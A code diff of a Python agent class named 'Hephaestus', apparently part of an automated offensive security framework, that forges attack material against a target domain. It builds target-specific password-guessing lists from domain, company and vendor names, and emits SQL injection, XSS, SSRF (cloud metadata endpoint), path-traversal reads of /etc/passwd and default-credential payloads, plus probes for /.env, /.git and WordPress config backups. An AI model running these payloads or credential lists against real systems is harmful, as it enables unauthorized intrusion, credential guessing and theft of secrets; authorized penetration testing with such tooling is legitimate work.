@@ -1,7 +1,6 @@
-import os
-import json
 from datetime import datetime
-from core.config import settings
+
+from core import wordlists as wl
 from .base import BaseAgent
 
 
@@ -9,14 +8,13 @@ class Hephaestus(BaseAgent):
     name = "hephaestus"
     symbol = "🔥"
     display_name = "HEPHAESTUS"
-    role = "Payload Forge & Exploit Preparation"
+    role = "Payload Forge & Wordlist Generation"
 
     async def execute(self, target: str, context: dict = None) -> dict:
         hermes = (context or {}).get("hermes", {})
         ares = (context or {}).get("ares", {})
-        athena = (context or {}).get("athena", {})
 
-        await self.log("Analyzing findings to prepare targeted payloads", "info")
+        await self.log("Analyzing findings to forge targeted payloads and wordlists", "info")
 
         result = {
             "payloads_generated": [],
@@ -26,174 +24,159 @@ class Hephaestus(BaseAgent):
         }
 
         vulns = ares.get("vulnerabilities", [])
-        live_hosts = hermes.get("live_hosts", [])
         technologies = hermes.get("technologies", {})
         vendors = hermes.get("vendors", [])
         domain = hermes.get("domain", target)
 
-        await self.log(f"Building payload set from {len(vulns)} findings + {len(technologies)} tech fingerprints", "info")
+        await self.log(
+            f"Forging from {len(vulns)} findings + {len(technologies)} tech fingerprints + {len(vendors)} vendors",
+            "info",
+        )
 
-        # Custom wordlist based on target context
-        wordlist = await self._build_wordlist(domain, vendors, technologies, athena)
-        if wordlist:
-            wl_path = os.path.join(settings.reports_dir, f"wordlist_{domain.replace('.', '_')}.txt")
-            try:
-                os.makedirs(settings.reports_dir, exist_ok=True)
-                with open(wl_path, "w") as f:
-                    f.write("\n".join(wordlist))
-                result["wordlists_created"].append({"path": wl_path, "entries": len(wordlist)})
-                await self.log(f"Custom wordlist: {len(wordlist)} entries written to {wl_path}", "success")
-            except Exception as e:
-                await self.log(f"Wordlist write failed: {e}", "warn")
+        # 1) Deterministic content-discovery wordlist from recon (no AI).
+        discovered_paths = [d.get("url", "") for d in ares.get("directories", []) if d.get("url")]
+        try:
+            entry = wl.build_target_list(self.mission_id, hermes, discovered_paths)
+            result["wordlists_created"].append(entry)
+            await self.log(
+                f"Content-discovery wordlist: {entry['count']} entries -> {entry['id']}",
+                "success",
+            )
+        except Exception as e:
+            await self.log(f"Content wordlist generation failed: {e}", "warn")
 
-        # Payload sets for identified vulnerability classes
+        # 2) Credential wordlist (target-flavored password guesses).
+        creds = self._build_credentials(domain, vendors, technologies)
+        try:
+            centry = wl.write_list(f"creds-{wl.slugify(domain)}", creds)
+            result["wordlists_created"].append(centry)
+            await self.log(f"Credential wordlist: {centry['count']} entries -> {centry['id']}", "success")
+        except Exception as e:
+            await self.log(f"Credential wordlist write failed: {e}", "warn")
+
+        # 3) Payload sets for identified vulnerability classes.
         for vuln in vulns:
             sev = vuln.get("severity", "info")
             template = vuln.get("template", "")
             matched_at = vuln.get("matched_at", "")
-
             if sev in ("critical", "high") and matched_at:
                 payloads = self._payloads_for_template(template, matched_at)
                 if payloads:
                     result["payloads_generated"].extend(payloads)
                     result["exploitable_targets"].append(matched_at)
 
-        # Generic web payload sets based on tech stack
-        web_payloads = self._generic_web_payloads(technologies)
-        result["payloads_generated"].extend(web_payloads)
+        result["payloads_generated"].extend(self._generic_web_payloads(technologies))
 
-        # Save forge report
         result["forge_report"] = {
             "domain": domain,
             "total_payloads": len(result["payloads_generated"]),
             "exploitable_count": len(result["exploitable_targets"]),
-            "wordlist_entries": sum(w["entries"] for w in result["wordlists_created"]),
+            "wordlists": [w["id"] for w in result["wordlists_created"]],
+            "wordlist_entries": sum(w["count"] for w in result["wordlists_created"]),
             "timestamp": datetime.utcnow().isoformat(),
         }
 
         await self.log(
             f"Forge complete: {len(result['payloads_generated'])} payloads | "
-            f"{len(result['exploitable_targets'])} exploitable targets identified",
+            f"{len(result['wordlists_created'])} wordlists | "
+            f"{len(result['exploitable_targets'])} exploitable targets",
             "success",
         )
         return result
 
-    async def _build_wordlist(self, domain: str, vendors: list, technologies: dict, athena: dict) -> list:
+    def _build_credentials(self, domain: str, vendors: list, technologies: dict) -> list:
         words = set()
-
-        # Domain-derived
         parts = domain.split(".")
+        company = parts[0] if parts else domain
+
         for p in parts:
             if len(p) > 2:
-                words.add(p)
-                words.add(p.lower())
-                words.add(p.capitalize())
-                words.add(p + "123")
-                words.add(p + "2024")
-                words.add(p + "2025")
-                words.add(p + "!")
+                words.update([p, p.lower(), p.capitalize(),
+                              p + "123", p + "2024", p + "2025", p + "!"])
 
-        # Company name mutations
-        company = parts[0] if parts else domain
-        mutations = [
+        words.update([
             company, company.lower(), company.upper(), company.capitalize(),
             company + "@123", company + "123!", company + "2024!", company + "@2025",
             company + "_admin", company + "_dev", "admin_" + company,
             company[:4] + "2024", company[:4] + "!", "P@ss" + company,
-        ]
-        words.update(mutations)
+        ])
 
-        # Vendor-based (KnowBe4 + weak password training paradox)
-        vendor_names = [v["vendor"].split()[0].lower() for v in vendors]
-        for v in vendor_names:
-            words.add(v + "2024!")
-            words.add(v + "@123")
+        for v in vendors:
+            vendor = v.get("vendor", "") if isinstance(v, dict) else str(v)
+            first = vendor.split()[0].lower() if vendor.split() else ""
+            if first:
+                words.update([first + "2024!", first + "@123"])
 
-        # Tech-specific paths / admin defaults
         all_techs = []
-        for tech_list in technologies.values():
-            all_techs.extend(tech_list)
-
+        for tl in technologies.values():
+            all_techs.extend(tl)
         if any("WordPress" in t for t in all_techs):
             words.update(["admin", "password", "wordpress", "wp-admin", "admin123", "letmein"])
         if any("Drupal" in t for t in all_techs):
             words.update(["drupal", "admin", "password1", "admin@drupal"])
-        if any("nginx" in t.lower() for t in all_techs):
-            words.update(["nginx", "webmaster"])
 
-        # Common corporate password patterns
         words.update([
             "Password1", "Password1!", "Welcome1", "Welcome1!",
             "Summer2024!", "Winter2024!", "Spring2025!", "Fall2024!",
             "January@1", "Admin@123", "Letmein1!", "Changeme1",
             "Qwerty123!", "Company1!", "123456Aa!",
         ])
-
-        return sorted(list(words))
+        return sorted(words)
 
     def _payloads_for_template(self, template: str, url: str) -> list:
-        payloads = []
         tl = template.lower()
-
         if "sqli" in tl or "sql-injection" in tl:
-            payloads = [
+            return [
                 {"type": "SQLi", "payload": "' OR '1'='1", "target": url},
                 {"type": "SQLi", "payload": "' OR 1=1--", "target": url},
                 {"type": "SQLi", "payload": "admin'--", "target": url},
                 {"type": "SQLi", "payload": "1' AND SLEEP(5)--", "target": url},
             ]
-        elif "xss" in tl:
-            payloads = [
+        if "xss" in tl:
+            return [
                 {"type": "XSS", "payload": "<script>alert(1)</script>", "target": url},
                 {"type": "XSS", "payload": "<img src=x onerror=alert(document.domain)>", "target": url},
                 {"type": "XSS", "payload": "javascript:alert(1)", "target": url},
             ]
-        elif "ssrf" in tl:
-            payloads = [
+        if "ssrf" in tl:
+            return [
                 {"type": "SSRF", "payload": "http://169.254.169.254/latest/meta-data/", "target": url},
                 {"type": "SSRF", "payload": "http://localhost:8080/", "target": url},
             ]
-        elif "lfi" in tl or "path-traversal" in tl:
-            payloads = [
+        if "lfi" in tl or "path-traversal" in tl:
+            return [
                 {"type": "LFI", "payload": "../../../etc/passwd", "target": url},
                 {"type": "LFI", "payload": "....//....//....//etc/passwd", "target": url},
             ]
-        elif "default-login" in tl or "default-creds" in tl:
-            payloads = [
+        if "default-login" in tl or "default-creds" in tl:
+            return [
                 {"type": "DefaultCreds", "payload": "admin:admin", "target": url},
                 {"type": "DefaultCreds", "payload": "admin:password", "target": url},
                 {"type": "DefaultCreds", "payload": "admin:123456", "target": url},
             ]
-
-        return payloads
+        return []
 
     def _generic_web_payloads(self, technologies: dict) -> list:
         all_techs = []
-        for tech_list in technologies.values():
-            all_techs.extend([t.lower() for t in tech_list])
+        for tl in technologies.values():
+            all_techs.extend([t.lower() for t in tl])
 
-        payloads = []
-
-        # Universal recon payloads
-        payloads.extend([
+        payloads = [
             {"type": "Recon", "payload": "/../../../etc/passwd", "note": "Path traversal"},
             {"type": "Recon", "payload": "/.git/HEAD", "note": "Git exposure"},
             {"type": "Recon", "payload": "/.env", "note": "Environment file"},
             {"type": "Recon", "payload": "/robots.txt", "note": "Robots disclosure"},
             {"type": "Recon", "payload": "/sitemap.xml", "note": "Sitemap enum"},
-        ])
-
+        ]
         if any("php" in t for t in all_techs):
             payloads.extend([
                 {"type": "PHP", "payload": "<?php phpinfo(); ?>", "note": "PHP info probe"},
                 {"type": "PHP", "payload": "/?page=../../../../etc/passwd", "note": "PHP LFI"},
             ])
-
         if any("wordpress" in t for t in all_techs):
             payloads.extend([
                 {"type": "WordPress", "payload": "/wp-json/wp/v2/users", "note": "User enum via API"},
                 {"type": "WordPress", "payload": "/wp-content/debug.log", "note": "Debug log"},
                 {"type": "WordPress", "payload": "/wp-config.php.bak", "note": "Config backup"},
             ])
-
         return payloads
